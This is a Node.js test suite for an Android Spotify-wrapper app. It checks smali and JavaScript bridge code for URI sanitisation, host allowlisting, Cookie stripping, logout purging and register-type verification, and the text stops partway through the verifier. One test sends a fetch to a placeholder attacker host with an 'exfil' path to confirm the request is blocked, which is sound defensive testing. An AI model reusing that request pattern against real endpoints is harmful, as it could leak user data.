const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');

const ROOT = path.resolve(__dirname, '..');

function readRepoFile(relPath) {
    return fs.readFileSync(path.join(ROOT, relPath), 'utf8');
}

function extractSmaliMethod(source, signaturePrefix) {
    const start = source.indexOf(signaturePrefix);
    if (start === -1) return null;
    const end = source.indexOf('.end method', start);
    if (end === -1) return null;
    return source.slice(start, end + '.end method'.length);
}

class MockHeaders {
    constructor(init) {
        this._map = new Map();
        if (init instanceof MockHeaders) {
            init.forEach((v, k) => this.set(k, v));
        } else if (Array.isArray(init)) {
            for (const pair of init) {
                if (pair && pair.length >= 2) this.set(pair[0], pair[1]);
            }
        } else if (init && typeof init === 'object') {
            for (const [k, v] of Object.entries(init)) {
                this.set(k, v);
            }
        }
    }
    set(k, v) { this._map.set(String(k).toLowerCase(), [String(k), String(v)]); }
    get(k) {
        const entry = this._map.get(String(k).toLowerCase());
        return entry ? entry[1] : null;
    }
    forEach(cb, thisArg) {
        for (const [origKey, val] of this._map.values()) {
            cb.call(thisArg, val, origKey, this);
        }
    }
    *entries() {
        for (const [origKey, val] of this._map.values()) {
            yield [origKey, val];
        }
    }
    [Symbol.iterator]() {
        return this.entries();
    }
}

function createBridgeVm({ nativeFetchImpl, oriFetchImpl } = {}) {
    const intervals = [];
    const observers = [];
    const oriFetchCalls = [];
    const nativeFetchCalls = [];

    const oriFetch = oriFetchImpl || (async (url, opts) => {
        oriFetchCalls.push({ url, opts });
        return {
            ok: true,
            status: 200,
            headers: new MockHeaders(),
            text: async () => '{"fallback":true}',
            json: async () => ({ fallback: true }),
        };
    });

    class MockResponse {
        constructor(body, init = {}) {
            this._body = String(body == null ? '' : body);
            this.status = init.status === undefined ? 200 : Number(init.status);
            this.ok = this.status >= 200 && this.status < 300;
            this.headers = new MockHeaders(init.headers || {});
        }
        async text() { return this._body; }
        async json() { return JSON.parse(this._body); }
    }

    class MockMutationObserver {
        constructor(cb) {
            this.cb = cb;
            observers.push(this);
        }
        observe() {}
        disconnect() {}
    }

    const doc = {
        hidden: false,
        readyState: 'complete',
        documentElement: {},
        body: { appendChild() {}, removeChild() {} },
        head: { appendChild() {} },
        createElement: () => ({
            style: {},
            setAttribute() {},
            appendChild() {},
            addEventListener() {},
        }),
        querySelector: () => null,
        querySelectorAll: () => [],
        getElementById: () => null,
        addEventListener() {},
        removeEventListener() {},
    };

    const sandbox = {
        console: { log() {}, warn() {}, error() {}, info() {} },
        Headers: MockHeaders,
        Response: MockResponse,
        URL,
        URLSearchParams,
        MutationObserver: MockMutationObserver,
        CustomEvent: function CustomEvent(type, detail) { this.type = type; this.detail = detail; },
        Event: function Event(type) { this.type = type; },
        navigator: { mediaSession: null, userAgent: 'Mozilla/5.0' },
        location: {
            href: 'https://open.spotify.com/',
            origin: 'https://open.spotify.com',
            hostname: 'open.spotify.com',
            pathname: '/',
            search: '',
            assign() {},
            replace() {},
            reload() {},
        },
        history: { pushState() {}, replaceState() {}, back() {} },
        localStorage: {
            _s: new Map(),
            getItem(k) { return this._s.has(k) ? this._s.get(k) : null; },
            setItem(k, v) { this._s.set(k, String(v)); },
            removeItem(k) { this._s.delete(k); },
            clear() { this._s.clear(); },
        },
        sessionStorage: {
            _s: new Map(),
            getItem(k) { return this._s.has(k) ? this._s.get(k) : null; },
            setItem(k, v) { this._s.set(k, String(v)); },
            removeItem(k) { this._s.delete(k); },
            clear() { this._s.clear(); },
        },
        document: doc,
        fetch: oriFetch,
        XMLHttpRequest: function XMLHttpRequest() {},
        WebSocket: function WebSocket() {},
        Audio: function Audio() {},
        HTMLMediaElement: { prototype: { play() { return Promise.resolve(); }, pause() {} } },
        Node: { ELEMENT_NODE: 1 },
        Element: function Element() {},
        HTMLElement: function HTMLElement() {},
        setTimeout: (fn) => ({ fn }),
        clearTimeout: () => {},
        setInterval: (fn, ms) => {
            const handle = { fn, ms, cleared: false };
            intervals.push(handle);
            return handle;
        },
        clearInterval: (handle) => {
            if (handle) handle.cleared = true;
        },
        requestAnimationFrame: () => 1,
        cancelAnimationFrame: () => {},
        matchMedia: () => ({ matches: false, addEventListener() {} }),
        addEventListener() {},
        removeEventListener() {},
        dispatchEvent() {},
        AndBridge: {
            nativeFetch(url, method, headersJson, body) {
                nativeFetchCalls.push({ url, method, headersJson, body });
                if (nativeFetchImpl) {
                    return nativeFetchImpl(url, method, headersJson, body);
                }
                return JSON.stringify({ status: 200, body: '{"ok":true}', headers: {} });
            },
            logBridgeError() {},
            onPlaybackStateChanged() {},
            onTrackMetadataChanged() {},
            onNativeUiData() {},
            nativeLogout() {},
        },
    };
    sandbox.window = sandbox;
    sandbox.self = sandbox;
    sandbox.globalThis = sandbox;

    const code = readRepoFile('assets/spotify_bridge.js');
    vm.runInNewContext(code, sandbox, { filename: 'assets/spotify_bridge.js' });
    return { sandbox, code, intervals, observers, oriFetchCalls, nativeFetchCalls };
}

test('[D1] r4.smali never concatenates raw deep-link strings into evaluateJavascript playFromUri(...)', () => {
    const r4 = readRepoFile('smali/r4.smali');
    const guard = readRepoFile('smali/com/melodix/music/NativeFetchGuard.smali');

    assert.doesNotMatch(
        r4,
        /const-string v\d+, "playFromUri\('"/,
        'r4.smali must not concatenate raw deep-link strings inside single-quoted JS code'
    );
    assert.match(
        r4,
        /Lcom\/melodix\/music\/NativeFetchGuard;->buildSafePlayFromUriJs\(Ljava\/lang\/String;\)Ljava\/lang\/String;/,
        'r4.smali deep-link dispatchers must sanitize and quote URIs via NativeFetchGuard.buildSafePlayFromUriJs'
    );
    const builderMethod = extractSmaliMethod(
        guard,
        '.method public static buildSafePlayFromUriJs(Ljava/lang/String;)Ljava/lang/String;'
    );
    assert.ok(builderMethod, 'NativeFetchGuard.buildSafePlayFromUriJs must exist');
    assert.match(
        builderMethod,
        /Lorg\/json\/JSONObject;->quote\(Ljava\/lang\/String;\)Ljava\/lang\/String;/,
        'buildSafePlayFromUriJs must JSON-quote validated URIs'
    );
});

test('[D2] NativeImageLoader and r4 notification cover loader enforce NativeFetchGuard.parseAllowedUrl', () => {
    const loader = readRepoFile('smali/com/melodix/music/NativeImageLoader.smali');
    const r4 = readRepoFile('smali/r4.smali');

    assert.match(
        loader,
        /Lcom\/melodix\/music\/NativeFetchGuard;->parseAllowedUrl\(Ljava\/lang\/String;\)Ljava\/net\/URL;/,
        'NativeImageLoader.load must enforce the HTTPS Spotify/CDN host allowlist'
    );
    assert.match(
        r4,
        /Lcom\/melodix\/music\/NativeFetchGuard;->parseAllowedUrl\(Ljava\/lang\/String;\)Ljava\/net\/URL;/,
        'r4 notification artwork loader (:pswitch_6) must reject non-allowlisted / cleartext URLs'
    );
});

test('[D3] spotify_bridge.js preserves Headers instances, never turns status 0 into 200 OK, blocks disallowed URLs without fallback, and prevents double init', async () => {
    const { sandbox, code, intervals, observers, oriFetchCalls, nativeFetchCalls } = createBridgeVm({
        nativeFetchImpl(url) {
            if (url.includes('/timeout-test')) {
                return JSON.stringify({ status: 0, body: '', error: 'Request timed out' });
            }
            return JSON.stringify({ status: 200, body: '{"devices":{}}', headers: {} });
        },
    });

    // 3a. Headers instance must serialize Authorization & Client-Token while stripping Cookie
    const hdrs = new MockHeaders({
        Authorization: 'Bearer secret_spotify_token',
        'Client-Token': 'client_tok_abc',
        'Content-Type': 'application/json',
        Cookie: 'sp_dc=should_never_cross_bridge',
    });
    const okRes = await sandbox.fetch(
        'https://gew4-spclient.spotify.com/connect-state/v1/devices/hobs_device1',
        { method: 'PUT', headers: hdrs, body: '{"seq":1}' }
    );
    assert.equal(okRes.status, 200);
    assert.equal(nativeFetchCalls.length, 1);
    const forwardedHeaders = JSON.parse(nativeFetchCalls[0].headersJson);
    assert.equal(forwardedHeaders.Authorization, 'Bearer secret_spotify_token');
    assert.equal(forwardedHeaders['Client-Token'], 'client_tok_abc');
    assert.equal(forwardedHeaders['Content-Type'], 'application/json');
    assert.equal(forwardedHeaders.Cookie, undefined);
    assert.equal(forwardedHeaders.cookie, undefined);

    // 3b. Native bridge transport failure (status: 0) must NOT resolve as fake HTTP 200 OK
    await assert.rejects(
        () => sandbox.fetch(
            'https://gew4-spclient.spotify.com/connect-state/v1/devices/timeout-test',
            { method: 'GET' }
        ),
        /timed out|Native fetch failed/i
    );

    // 3c. Disallowed host/scheme matching connect-state path must reject immediately WITHOUT calling oriFetch
    oriFetchCalls.length = 0;
    await assert.rejects(
        () => sandbox.fetch('http://evil.attacker.example/connect-state/v1/exfil', { method: 'GET' }),
        /Blocked disallowed/i
    );
    assert.equal(oriFetchCalls.length, 0, 'Disallowed URL must never fall through to oriFetch');

    // 3d. Re-injecting spotify_bridge.js into the same window must be idempotent
    const intervalsBefore = intervals.length;
    const observersBefore = observers.length;
    vm.runInNewContext(code, sandbox, { filename: 'assets/spotify_bridge.js' });
    assert.equal(intervals.length, intervalsBefore, 'Re-injection must not allocate duplicate intervals');
    assert.equal(observers.length, observersBefore, 'Re-injection must not allocate duplicate MutationObservers');

    // 3e. NativeFetchGuard maps custom-scheme redirects to 403 and timeouts to 504
    const guard = readRepoFile('smali/com/melodix/music/NativeFetchGuard.smali');
    assert.match(guard, /Ljava\/net\/SocketTimeoutException;/, 'NativeFetchGuard must classify SocketTimeoutException explicitly');
    assert.match(guard, /0x1f8/, 'NativeFetchGuard must return HTTP 504 on SocketTimeoutException');
    assert.match(guard, /\.catch Ljava\/net\/MalformedURLException; \{:try_start_redirect[\s\S]*?:catch_bad_redirect/, 'Non-HTTP custom-scheme redirects must return 403 via :catch_bad_redirect -> :reject_redirect');
});

test('[D4] Logout purges cached JS home globals, stops timers from re-emitting Account A state, and guards native session epoch + destroy lifecycle', () => {
    const uiPayloads = [];
    let logoutCalled = 0;
    const intervals = [];

    const doc = {
        hidden: false,
        title: 'Secret Song Account A - Spotify',
        body: { innerText: '' },
        documentElement: {
            dataset: {},
            classList: { add() {}, remove() {}, contains: () => false },
            style: { setProperty() {} },
        },
        querySelector(sel) {
            if (sel === '[data-testid="context-item-info-title"]') {
                return { textContent: 'Secret Song Account A' };
            }
            if (sel === '[data-testid="context-item-info-subtitles"]') {
                return { textContent: 'Private Artist A' };
            }
            return null;
        },
        querySelectorAll: () => [],
        getElementById: () => null,
        createElement: () => ({
            style: {},
            setAttribute() {},
            appendChild() {},
            remove() {},
        }),
        head: { appendChild() {} },
        addEventListener() {},
        removeEventListener() {},
    };

    const sandbox = {
        console: { log() {}, warn() {}, error() {}, info() {} },
        URL,
        MutationObserver: function MutationObserver() {
            this.observe = () => {};
            this.disconnect = () => { this.disconnected = true; };
        },
        navigator: { userAgent: 'Mozilla/5.0' },
        location: {
            href: 'https://open.spotify.com/',
            origin: 'https://open.spotify.com',
            hostname: 'open.spotify.com',
            pathname: '/',
            search: '',
            assign() {},
        },
        history: { back() {}, pushState() {}, replaceState() {} },
        localStorage: { clear() { this.cleared = true; }, getItem: () => null, setItem() {}, removeItem() {} },
        sessionStorage: { clear() { this.cleared = true; }, getItem: () => null, setItem() {}, removeItem() {} },
        document: doc,
        Node: { ELEMENT_NODE: 1 },
        setTimeout: (fn) => ({ fn }),
        clearTimeout: (t) => { if (t) t.cleared = true; },
        setInterval: (fn, ms) => {
            const handle = { fn, ms, cleared: false };
            intervals.push(handle);
            return handle;
        },
        clearInterval: (h) => { if (h) h.cleared = true; },
        AndBridge: {
            onNativeUiData(type, json) {
                uiPayloads.push({ type, json });
            },
            nativeLogout() {
                logoutCalled += 1;
            },
            logBridgeError() {},
        },
        __sfNativeHomeRowsJson: '[{"title":"Secret Playlist Account A"}]',
        __sfNativeHomeListText: 'Secret Playlist Account A',
    };
    sandbox.window = sandbox;
    sandbox.self = sandbox;
    sandbox.globalThis = sandbox;

    vm.runInNewContext(readRepoFile('assets/native_ui_shell.js'), sandbox, {
        filename: 'assets/native_ui_shell.js',
    });

    uiPayloads.length = 0;
    sandbox.__sfToggleSpotifySetting('spotify:settings:logout');

    assert.equal(logoutCalled, 1, 'AndBridge.nativeLogout() must be invoked');
    assert.equal(sandbox.__sfNativeHomeRowsJson, '', 'Logout must purge window.__sfNativeHomeRowsJson');
    assert.equal(sandbox.__sfNativeHomeListText, '', 'Logout must purge window.__sfNativeHomeListText');
    assert.ok(intervals.every((h) => h.cleared), 'Logout must clear active intervals in native_ui_shell.js');

    // Even if an already-queued callback invokes old interval fns after nativeLogout(), zero Account A data may cross AndBridge
    for (const h of intervals) {
        h.fn();
    }
    assert.equal(uiPayloads.length, 0, 'Zero Account A UI payloads may be sent after logout');

    // Verify native MainActivity logout purge & epoch guards
    const mainSmali = readRepoFile('smali/com/melodix/music/MainActivity.smali');
    assert.match(mainSmali, /\.field public (?:static )?nativeSessionEpoch:I/);
    const resetMethod = extractSmaliMethod(mainSmali, '.method public final resetNativeStateForLogout()V');
    assert.ok(resetMethod);
    assert.match(resetMethod, /nativeSessionEpoch:I/, 'resetNativeStateForLogout must bump nativeSessionEpoch');
    assert.match(resetMethod, /0x7f090249/, 'resetNativeStateForLogout must clear @id/nativeHeaderAvatar');
    assert.match(resetMethod, /Lcom\/melodix\/music\/WebService;->B:Landroid\/graphics\/Bitmap;/, 'resetNativeStateForLogout must clear cached WebService.B cover bitmap');

    const destroyMethod = extractSmaliMethod(mainSmali, '.method public final onDestroy()V');
    assert.match(destroyMethod, /removeCallbacksAndMessages\(Ljava\/lang\/Object;\)V/, 'MainActivity.onDestroy must purge all pending Handler callbacks');

    for (const rel of [
        'smali/com/melodix/music/NativeUiUpdateRunnable.smali',
        'smali/com/melodix/music/NativeHomePaintRunnable.smali',
        'smali/com/melodix/music/NativeListPaintRunnable.smali',
        'smali/com/melodix/music/NativeHomeRetryRunnable.smali',
        'smali/com/melodix/music/NativeOpenRowRunnable.smali',
    ]) {
        const src = readRepoFile(rel);
        assert.match(src, /nativeSessionEpoch:I/, `${rel} must validate nativeSessionEpoch`);
        assert.match(src, /isDestroyed\(\)Z/, `${rel} must abort when MainActivity is destroyed`);
    }
});

function verifySmaliSource(rel, content) {
    const UNINIT = 0;
    const ZERO = 1;
    const PRIM = 2;
    const WIDE_LO = 3;
    const WIDE_HI = 4;
    const REF = 5;
    const CONFLICT = 6;

    function joinType(a, b) {
        if (a === b) return a;
        if (a === UNINIT || b === UNINIT || a === CONFLICT || b === CONFLICT) return CONFLICT;
        if (a === ZERO && (b === PRIM || b === REF)) return b;
        if (b === ZERO && (a === PRIM || a === REF)) return a;
        return CONFLICT;
    }

    function descSlots(sig, hasReceiver) {
        const m = sig.match(/\(([^)]*)\)/);
        const desc = m ? m[1] : '';
        const slots = [];
        if (hasReceiver) slots.push(REF);
        let i = 0;
        while (i < desc.length) {
            if (desc[i] === '[') {
                while (i < desc.length && desc[i] === '[') i++;
                i = desc[i] === 'L' ? desc.indexOf(';', i) + 1 : i + 1;
                slots.push(REF);
            } else if (desc[i] === 'L') {
                i = desc.indexOf(';', i) + 1;
                slots.push(REF);
            } else if (desc[i] === 'J' || desc[i] === 'D') {
                slots.push(WIDE_LO, WIDE_HI);
                i++;
            } else {
                slots.push(PRIM);
                i++;
            }
        }
        return slots;
    }

    const bugs = [];
    const lines = content.split(/\r?\n/);
    let inMethod = false;
    let fieldSection = null;
    let sig = '';
    let isStatic = false;
    let nLocals = null;
    let body = [];

    function parseReg(tok, nLoc) {
        const m = tok.match(/^([vp])(\d+)$/);
        if (!m) return null;
        return m[1] === 'v' ? Number(m[2]) : nLoc + Number(m[2]);
    }

    function expandRegList(spec, nLoc) {
        const inner = spec.trim();
        if (!inner) return [];
        const range = inner.match(/^([vp]\d+)\s*\.\.\s*([vp]\d+)$/);
        if (range) {
            const a = parseReg(range[1], nLoc);
            const b = parseReg(range[2], nLoc);
            if (a === null || b === null || b < a) return null;
            const out = [];
            for (let r = a; r <= b; r++) out.push(r);
            return out;
        }
        return inner.split(',').map((t) => parseReg(t.trim(), nLoc));
    }

    function verifyMethod() {
        if (nLocals === null) return;
        const pSlots = descSlots(sig, !isStatic);
        const total = nLocals + pSlots.length;
        const labels = new Map();
        const switches = new Map();
        const catches = [];
        const insns = [];
        let activeSwitch = null;
        let activeArrayData = false;

        for (const [lineNo, s] of body) {
            if (activeArrayData) {
                if (s === '.end array-data') activeArrayData = false;
                continue;
            }
            if (activeSwitch) {
                if (s.startsWith('.end packed-switch') || s.startsWith('.end sparse-switch')) {
                    activeSwitch = null;
                } else if (s.includes(':')) {
                    const lbl = ':' + s.split(':').pop().trim();
                    if (/^:[A-Za-z0-9_$-]+$/.test(lbl)) activeSwitch.push(lbl);
                }
                continue;
            }
            if (s === '.array-data' || s.startsWith('.array-data ')) {
                activeArrayData = true;
                continue;
            }
            if (s.startsWith('.packed-switch') || s.startsWith('.sparse-switch')) {
                activeSwitch = [];
                if (insns.length > 0 && insns[insns.length - 1].pendingLabel) {
                    switches.set(insns[insns.length - 1].pendingLabel, activeSwitch);
                }
                continue;
            }
            if (s.startsWith(':')) {
                labels.set(s.split(/\s+/)[0], insns.length);
                if (s.startsWith(':pswitch_data_') || s.startsWith(':sswitch_data_')) {
                    switches.set(s.split(/\s+/)[0], []);
                }
                continue;
            }
            const cm = s.match(/^\.(catchall|catch)\s+(?:[^\s]+\s+)?\{(:[^\s.]+)\s*\.\.\s*(:[^\s}]+)\}\s*(:[^\s]+)$/);
            if (cm) {
                catches.push({ lineNo, kind: cm[1], startLbl: cm[2], endLbl: cm[3], handlerLbl: cm[4] });
                continue;
            }
            if (s.startsWith('.') || s.startsWith('#')) continue;
            insns.push({ lineNo, s });
        }

        for (const [lbl, arr] of switches.entries()) {
            // Re-scan switch body for labels defined right before .packed-switch/.sparse-switch
            if (arr.length === 0) {
                let seenLbl = false;
                let collecting = false;
                for (const [, s] of body) {
                    if (s.split(/\s+/)[0] === lbl) { seenLbl = true; continue; }
                    if (seenLbl && (s.startsWith('.packed-switch') || s.startsWith('.sparse-switch'))) { collecting = true; continue; }
                    if (collecting) {
                        if (s.startsWith('.end packed-switch') || s.startsWith('.end sparse-switch')) break;
                        const t = ':' + s.split(':').pop().trim();
                        if (/^:[A-Za-z0-9_$-]+$/.test(t)) arr.push(t);
                    }
                }
            }
        }

        const resolvedCatches = [];
        for (const c of catches) {
            const sp = labels.get(c.startLbl);
            const ep = labels.get(c.endLbl);
            const hp = labels.get(c.handlerLbl);
            if (sp === undefined || ep === undefined || hp === undefined) {
                bugs.push(`MISSING_CATCH_LABEL ${rel}:${c.lineNo} ${sig} -> ${c.startLbl}..${c.endLbl} -> ${c.handlerLbl}`);
                continue;
            }
            if (sp >= ep) {
                bugs.push(`EMPTY_OR_INVERTED_TRY ${rel}:${c.lineNo} ${sig} -> ${c.startLbl}(${sp})..${c.endLbl}(${ep})`);
                continue;
            }
            resolvedCatches.push({ ...c, sp, ep, hp });
        }

        if (insns.length === 0) return;

        // Per-instruction static checks (bounds, 4-bit widths, param aliasing)
        for (const { lineNo, s } of insns) {
            const noStr = s.replace(/"(?:\\.|[^"])*"/g, '""');
            const head = noStr.split('->')[0].replace(/L[^;\s]+;/g, 'TYPE');
            for (const vm of head.matchAll(/\bv(\d+)\b/g)) {
                const k = Number(vm[1]);
                if (k >= total) bugs.push(`OOB_VREG ${rel}:${lineNo} ${sig} -> ${s}`);
                else if (k >= nLocals) bugs.push(`VREG_ALIASES_PARAM ${rel}:${lineNo} ${sig} -> ${s}`);
            }
            for (const pm of head.matchAll(/\bp(\d+)\b/g)) {
                const k = nLocals + Number(pm[1]);
                if (k >= total) bugs.push(`OOB_PREG ${rel}:${lineNo} ${sig} -> ${s}`);
            }
            if (/^(?:move(?:-wide|-object)?\s|const\/4\s|[iu]get|[iu]put|if-(?:eq|ne|lt|ge|gt|le)\b|invoke-(?:virtual|super|direct|static|interface)(?!\/range)\b)/.test(s)) {
                for (const rm of head.matchAll(/\b([vp])(\d+)\b/g)) {
                    const abs = rm[1] === 'v' ? Number(rm[2]) : nLocals + Number(rm[2]);
                    if (abs >= 16) {
                        bugs.push(`FOUR_BIT_REG_OVERFLOW(v${abs}) ${rel}:${lineNo} ${sig} -> ${s}`);
                    }
                }
            }
            const wm = s.match(/^(?:const-wide(?:\/16|\/32|\/high16)?|move-wide(?:\/from16|\/16)?|move-result-wide|aget-wide|[is]get-wide|(?:add|sub|mul|div|rem|and|or|xor|shl|shr|ushr|neg|not)-(?:long|double)(?:\/2addr)?|[a-z]+-to-(?:long|double))\s+([vp])(\d+)\b/);
            if (wm) {
                const absReg = wm[1] === 'v' ? Number(wm[2]) : nLocals + Number(wm[2]);
                if (absReg + 1 >= total) bugs.push(`WIDE_OOB ${rel}:${lineNo} ${sig} -> ${s}`);
                else if (wm[1] === 'v' && absReg + 1 >= nLocals) bugs.push(`WIDE_CLOBBERS_PARAM ${rel}:${lineNo} ${sig} -> ${s}`);
            }
        }

        // True CFG + Dalvik Type-Lattice Worklist Abstract Interpretation across ALL instructions
        const inStates = new Array(insns.length).fill(null);
        const entry = new Array(total).fill(UNINIT);
        for (let i = 0; i < pSlots.length; i++) entry[nLocals + i] = pSlots[i];
        inStates[0] = entry;
        const queue = [0];
        const inQueue = new Set([0]);
        const reportedPcs = new Set();

        function mergeInto(targetPc, candidate) {
            if (targetPc === undefined || targetPc < 0 || targetPc >= insns.length) return;
            const cur = inStates[targetPc];
            if (!cur) {
                inStates[targetPc] = candidate.slice();
                if (!inQueue.has(targetPc)) { queue.push(targetPc); inQueue.add(targetPc); }
                return;
            }
            let changed = false;
            for (let r = 0; r < total; r++) {
                const joined = joinType(cur[r], candidate[r]);
                if (joined !== cur[r]) {
                    cur[r] = joined;
                    changed = true;
                }
            }
            if (changed && !inQueue.has(targetPc)) {
                queue.push(targetPc);
                inQueue.add(targetPc);
            }
        }

        function writeSingle(st, r, t) {
            if (r < 0 || r >= total) return;
            if (r > 0 && st[r] === WIDE_HI) st[r - 1] = CONFLICT;
            st[r] = t;
            if (r + 1 < total && st[r + 1] === WIDE_HI) st[r + 1] = CONFLICT;
        }

        function writeWide(st, r) {
            if (r < 0 || r + 1 >= total) return;
            if (r > 0 && st[r] === WIDE_HI) st[r - 1] = CONFLICT;
            st[r] = WIDE_LO;
            st[r + 1] = WIDE_HI;
            if (r + 2 < total && st[r + 2] === WIDE_HI) st[r + 2] = CONFLICT;
        }

        function flagConflict(pc, lineNo, s, msg) {
            const key = `${pc}:${msg}`;
            if (!reportedPcs.has(key)) {
                reportedPcs.add(key);
                bugs.push(`TYPE_VERIFY_ERROR ${rel}:${lineNo} ${sig} -> ${msg} at "${s}"`);
            }
        }

        while (queue.length > 0) {
            const pc = queue.shift();
            inQueue.delete(pc);
            const pre = inStates[pc];
            const { lineNo, s } = insns[pc];

            const sp = s.indexOf(' ');
            const op = sp === -1 ? s : s.slice(0, sp);
            const rest = sp === -1 ? '' : s.slice(sp + 1).trim();

            const canThrow = (
                op.startsWith('invoke-') ||
                op.startsWith('iget') || op.startsWith('iput') ||
                op.startsWith('sget') || op.startsWith('sput') ||
                op.startsWith('aget') || op.startsWith('aput') ||
                op === 'new-instance' || op === 'new-array' ||
                op.startsWith('filled-new-array') || op === 'fill-array-data' ||
                op === 'check-cast' || op === 'instance-of' || op === 'array-length' ||
                op.startsWith('const-string') || op === 'const-class' ||
                op.startsWith('monitor-') || op === 'throw' ||
                /^(?:div|rem)-(?:int|long)/.test(op)
            );
            if (canThrow) {
                for (const c of resolvedCatches) {
                    if (pc >= c.sp && pc < c.ep) mergeInto(c.hp, pre);
                }
            }

            const st = pre.slice();
            const checkRef = (r) => {
                if (r === null || r < 0 || r >= total) return;
                if (st[r] !== REF && st[r] !== ZERO) flagConflict(pc, lineNo, s, `expected REF in reg#${r} (got ${st[r]})`);
            };
            const checkPrim = (r) => {
                if (r === null || r < 0 || r >= total) return;
                if (st[r] !== PRIM && st[r] !== ZERO) flagConflict(pc, lineNo, s, `expected PRIM in reg#${r} (got ${st[r]})`);
            };
            const checkWide = (r) => {
                if (r === null || r < 0 || r + 1 >= total) return;
                if (st[r] !== WIDE_LO || st[r + 1] !== WIDE_HI) flagConflict(pc, lineNo, s, `expected WIDE in reg#${r}..#${r + 1} (got ${st[r]},${st[r + 1]})`);
            };

            let fallthrough = true;
            if (op === 'nop') {
                // no-op
            } else if (op === 'return-void') {
                fallthrough = false;
            } else if (op === 'return') {
                checkPrim(parseReg(rest, nLocals));
                fallthrough = false;
            } else if (op === 'return-wide') {
                checkWide(parseReg(rest, nLocals));
                fallthrough = false;
            } else if (op === 'return-object') {
                checkRef(parseReg(rest, nLocals));
                fallthrough = false;
            } else if (op === 'throw') {
                checkRef(parseReg(rest, nLocals));
                fallthrough = false;
            } else if (op === 'goto' || op === 'goto/16' || op === 'goto/32') {
                mergeInto(labels.get(rest), st);
                fallthrough = false;
            } else if (op === 'packed-switch' || op === 'sparse-switch') {
                const [rTok, lbl] = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(rTok, nLocals));
                for (const t of switches.get(lbl) || []) mergeInto(labels.get(t), st);
            } else if (op === 'move' || op === 'move/from16' || op === 'move/16') {
                const [d, src] = rest.split(',').map((x) => parseReg(x.trim(), nLocals));
                checkPrim(src);
                writeSingle(st, d, src !== null && st[src] === ZERO ? ZERO : PRIM);
            } else if (op === 'move-object' || op === 'move-object/from16' || op === 'move-object/16') {
                const [d, src] = rest.split(',').map((x) => parseReg(x.trim(), nLocals));
                checkRef(src);
                writeSingle(st, d, src !== null && st[src] === ZERO ? ZERO : REF);
            } else if (op === 'move-wide' || op === 'move-wide/from16' || op === 'move-wide/16') {
                const [d, src] = rest.split(',').map((x) => parseReg(x.trim(), nLocals));
                checkWide(src);
                writeWide(st, d);
            } else if (op === 'move-result') {
                writeSingle(st, parseReg(rest, nLocals), PRIM);
            } else if (op === 'move-result-wide') {
                writeWide(st, parseReg(rest, nLocals));
            } else if (op === 'move-result-object' || op === 'move-exception') {
                writeSingle(st, parseReg(rest, nLocals), REF);
            } else if (op === 'const/4' || op === 'const/16' || op === 'const' || op === 'const/high16') {
                const [dTok, lit] = rest.split(',').map((x) => x.trim());
                const isZero = /^[-+]?(?:0x0+|0)$/.test(lit);
                writeSingle(st, parseReg(dTok, nLocals), isZero ? ZERO : PRIM);
            } else if (op.startsWith('const-wide')) {
                const [dTok] = rest.split(',').map((x) => x.trim());
                writeWide(st, parseReg(dTok, nLocals));
            } else if (op === 'const-string' || op === 'const-string/jumbo' || op === 'const-class' || op === 'new-instance') {
                const [dTok] = rest.split(',').map((x) => x.trim());
                writeSingle(st, parseReg(dTok, nLocals), REF);
            } else if (op === 'monitor-enter' || op === 'monitor-exit' || op === 'fill-array-data') {
                const [rTok] = rest.split(',').map((x) => x.trim());
                checkRef(parseReg(rTok, nLocals));
            } else if (op === 'check-cast') {
                const [rTok] = rest.split(',').map((x) => x.trim());
                const r = parseReg(rTok, nLocals);
                checkRef(r);
                writeSingle(st, r, REF);
            } else if (op === 'instance-of' || op === 'array-length') {
                const [dTok, sTok] = rest.split(',').map((x) => x.trim());
                checkRef(parseReg(sTok, nLocals));
                writeSingle(st, parseReg(dTok, nLocals), PRIM);
            } else if (op === 'new-array') {
                const [dTok, lenTok] = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(lenTok, nLocals));
                writeSingle(st, parseReg(dTok, nLocals), REF);
            } else if (op === 'filled-new-array' || op === 'filled-new-array/range') {
                const bm = rest.match(/^\{([^}]*)\},\s*(.+)$/);
                if (bm) {
                    const regs = expandRegList(bm[1], nLocals) || [];
                    const elemIsRef = bm[2].trim().slice(1).startsWith('L') || bm[2].trim().slice(1).startsWith('[');
                    for (const r of regs) (elemIsRef ? checkRef : checkPrim)(r);
                }
            } else if (op === 'if-eq' || op === 'if-ne') {
                const [aTok, bTok, lbl] = rest.split(',').map((x) => x.trim());
                const ra = parseReg(aTok, nLocals);
                const rb = parseReg(bTok, nLocals);
                const ta = st[ra];
                const tb = st[rb];
                const bothRef = (ta === REF || ta === ZERO) && (tb === REF || tb === ZERO);
                const bothPrim = (ta === PRIM || ta === ZERO) && (tb === PRIM || tb === ZERO);
                if (!bothRef && !bothPrim) {
                    flagConflict(pc, lineNo, s, `incompatible ${op} operand types (${ta} vs ${tb})`);
                }
                mergeInto(labels.get(lbl), st);
            } else if (op === 'if-lt' || op === 'if-ge' || op === 'if-gt' || op === 'if-le') {
                const [aTok, bTok, lbl] = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(aTok, nLocals));
                checkPrim(parseReg(bTok, nLocals));
                mergeInto(labels.get(lbl), st);
            } else if (op === 'if-eqz' || op === 'if-nez') {
                const [aTok, lbl] = rest.split(',').map((x) => x.trim());
                const ra = parseReg(aTok, nLocals);
                if (st[ra] !== REF && st[ra] !== PRIM && st[ra] !== ZERO) {
                    flagConflict(pc, lineNo, s, `invalid ${op} operand type (${st[ra]})`);
                }
                mergeInto(labels.get(lbl), st);
            } else if (op === 'if-ltz' || op === 'if-gez' || op === 'if-gtz' || op === 'if-lez') {
                const [aTok, lbl] = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(aTok, nLocals));
                mergeInto(labels.get(lbl), st);
            } else if (op.startsWith('aget')) {
                const [dTok, arrTok, idxTok] = rest.split(',').map((x) => x.trim());
                checkRef(parseReg(arrTok, nLocals));
                checkPrim(parseReg(idxTok, nLocals));
                if (op === 'aget-wide') writeWide(st, parseReg(dTok, nLocals));
                else writeSingle(st, parseReg(dTok, nLocals), op === 'aget-object' ? REF : PRIM);
            } else if (op.startsWith('aput')) {
                const [vTok, arrTok, idxTok] = rest.split(',').map((x) => x.trim());
                if (op === 'aput-wide') checkWide(parseReg(vTok, nLocals));
                else if (op === 'aput-object') checkRef(parseReg(vTok, nLocals));
                else checkPrim(parseReg(vTok, nLocals));
